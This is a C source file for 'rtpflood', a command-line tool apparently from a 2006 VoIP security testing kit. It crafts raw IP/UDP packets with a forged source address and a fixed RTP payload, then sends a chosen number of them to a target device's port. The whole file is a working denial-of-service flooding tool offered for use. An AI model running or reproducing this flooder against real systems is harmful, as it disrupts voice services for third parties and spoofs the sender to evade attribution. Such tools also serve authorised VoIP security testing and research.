//-------------------------------------------------------------------------------
//
// rtpflood.c - Command line tool used to flood any device
//                      processing RTP.
//
//  This tool is derived from code downloaded from
//  www.packetstromsecurity.nl. Its origin is
//  unknown. There was no copyright or license
//  accompanying the code. As such, the following
//  copyright/license is applied to this derivation.
//
//    Copyright (C) 2006  Mark D. Collier/Mark O'Brien
//
//    This program is free software; you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation; either version 2 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program; if not, write to the Free Software
//    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
//
//   Author: Mark D. Collier/Mark O'Brien - 07/01/2006  v1.0
//         www.securelogix.com - mark.collier@securelogix.com
//         www.hackingexposedvoip.com
//
//-------------------------------------------------------------------------------

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>

struct sockaddr sa;

main ( int argc, char **argv ) {

    int fd;
    int x = 1;
    int srcport, destport;
    int numpackets;
    int sequence_number;
    int timestamp;
    int SSID;

    struct sockaddr_in *p;
    struct hostent *he;

    u_char gram[200]=
            {
            0x45,	0xA0,	0x00,	0xC8,
            0x00,	0x00,	0x40,	0x00,
            0x40,	0x11,	0x5B,	0x29,
            0,	0,	0,	0,
            0,	0,	0,	0,

            0,	0,	0,	0,
            0x00,	0xB4,	0x00,	0x00,

            0x80,	0x00,	0x31,	0xCA,	0x1B,	0x2C,	0x7D,	0xBC,
            0x8B,	0xF3,	0x0F,	0x0F,	0xFB,	0xF8,	0xF4,	0xEE,
            0xFF,	0xF7,	0xF7,	0xFF,	0xFE,	0x72,	0x6F,	0xFD,
            0x7D,	0xF8,	0xF6,	0x76,	0x7F,	0x7C,	0xF7,	0xFE,
            0x75,	0x76,	0x6D,	0x6F,	0x74,	0x71,	0x6F,	0x7D,
            0xFC,	0x7C,	0xF5,	0xEF,	0xFB,	0x77,	0xF7,	0xEF,
            0x75,	0x7E,	0xFE,	0xFB,	0xED,	0xFE,	0xFA,	0xED,
            0xEE,	0xF3,	0xF7,	0x79,	0x7A,	0x79,	0x6F,	0x7B,
            0x6F,	0x76,	0xF6,	0x7D,	0x7A,	0xFE,	0x7E,	0xFB,
            0x78,	0x7A,	0xF2,	0x7A,	0x7E,	0xEE,	0xF0,	0x6F,
            0x6B,	0x76,	0x7B,	0x79,	0xFC,	0xFD,	0xFB,	0xEB,
            0xF6,	0xF7,	0xF6,	0x7A,	0x7E,	0x78,	0x71,	0x77,
            0xFC,	0x7D,	0x72,	0x73,	0xF7,	0xFC,	0x7F,	0xF1,
            0xFE,	0x76,	0xF7,	0xF5,	0x6E,	0x71,	0x79,	0x7D,
            0xFE,	0xEF,	0xF3,	0x79,	0xF9,	0xF2,	0xF4,	0x78,
            0xF7,	0xED,	0xFC,	0x78,	0x79,	0x73,	0x6D,	0x7C,
            0xF7,	0xFA,	0x7C,	0x71,	0xFC,	0x79,	0xFE,	0xF6,
            0x7A,	0xF8,	0xF6,	0xF1,	0x79,	0x6A,	0x7C,	0x74,
            0x75,	0xF3,	0xF5,	0xFE,	0xFE,	0xEE,	0xEE,	0x72,
            0xF9,	0xEF,	0x7C,	0xFE,	0xFC,	0x7E,	0x6E,	0xFA,
            0xF9,	0x73,	0xFD,	0x7B,	0x75,	0x7E,	0x7D,	0x70,
            0xF7,	0xE9,	0xF1,	0x6F
            };

            
    if ( argc != 9 ) {
        fprintf ( stderr,
                  "usage: %s sourcename destinationname srcport destport "
                  "numpackets seqno timestamp SSID\n",
                  *argv );
        exit ( EXIT_FAILURE );
    }

    srcport             = atoi ( argv[3] );
    destport            = atoi ( argv[4] );
    numpackets          = atoi ( argv[5] );
    sequence_number     = atoi ( argv[6] );
    timestamp           = atoi ( argv[7] );
    SSID                = atoi ( argv[8] );

    fprintf ( stderr,
              "\nWill flood port %d from port %d %d times\n",
              destport, srcport, numpackets );

    fprintf ( stderr,
              "Using sequence_number %d timestamp %d SSID %d\n",
              sequence_number, timestamp, SSID );
    
    if ( ( he = gethostbyname ( argv[1] ) ) == NULL ) {
        fprintf ( stderr, "can't resolve source hostname\n" );
        exit ( EXIT_FAILURE );
    }
    bcopy ( *(he->h_addr_list), (gram+12), 4 );

    if ( ( he = gethostbyname( argv[2] ) ) == NULL ) {
        fprintf ( stderr, "can't resolve destination hostname\n" );
        exit ( EXIT_FAILURE );
    }    
    bcopy ( *(he->h_addr_list), (gram+16), 4 );

    *(u_short*)(gram+20) = htons ( (u_short) srcport  );
    *(u_short*)(gram+22) = htons ( (u_short) destport );

    
    p = ( struct sockaddr_in* ) &sa;
    p->sin_family = AF_INET;
    bcopy ( *(he->h_addr_list), &(p->sin_addr), sizeof(struct in_addr) );

    if ( ( fd = socket ( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) == -1 ) {
        perror("socket");
        exit ( EXIT_FAILURE );
    }

    #ifdef IP_HDRINCL
    fprintf ( stderr, "\nWe have IP_HDRINCL \n" );
    if ( setsockopt ( fd, IPPROTO_IP, IP_HDRINCL, (char*)&x, sizeof(x) ) < 0 ) {
        perror ( "setsockopt IP_HDRINCL" );
        exit ( EXIT_FAILURE );
    }
    #else
    fprintf ( stderr, "\nWe don't have IP_HDRINCL \n" );
    #endif

    printf("\nNumber of Packets sent:\n\n");

    //
    //  Main loop
    //
            
    for ( x = 0; x < numpackets; x++ ) {
        
        *(u_short*)(gram+30) = htons ( (u_short) sequence_number );
        *(u_long *)(gram+32) = htonl ( (u_long ) timestamp       );
        *(u_long *)(gram+36) = htonl ( (u_long ) SSID            );

        if ( ( sendto ( fd,
                        &gram,
                        sizeof(gram),
                        0,
                        ( struct sockaddr* ) p,
                        sizeof(struct sockaddr) ) )
              == -1 ) {
            perror ( "sendto" );
            exit ( EXIT_FAILURE );
        }       

        usleep (20000);
        sequence_number++;
        timestamp =+ 160;
        printf ( "\rSent %d %d %d ",sequence_number, timestamp, x+1 );
        fflush ( NULL );
    }
    
    printf ( "\n" );
    exit ( EXIT_SUCCESS );
} // end rtpflood
